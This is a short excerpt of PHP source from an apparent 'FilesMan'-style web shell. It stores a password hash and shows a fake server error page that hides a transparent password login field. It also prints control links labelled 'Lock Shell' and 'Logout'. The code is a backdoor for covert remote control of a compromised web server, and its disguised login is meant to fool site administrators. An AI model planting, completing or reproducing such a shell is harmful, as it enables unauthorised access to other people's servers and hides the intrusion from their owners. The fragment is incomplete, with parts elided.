...
$▜ = 'UTF-8';
$▚ = 'FilesMan';
$▛ = 'df40e8cfcd762e89c1929429988a2480';
...
error was encountered while trying to use an ErrorDocument to handle the request.</p><pre align=right><form method=post><input type=password name=pass  style='border:transparent;'></form></pre></body></html>");
}
...
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&memek=gaskan">Lock Shell</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&logout=gaskan">Logout</a>&nbsp; ]</th>';
echo "</table><br>";
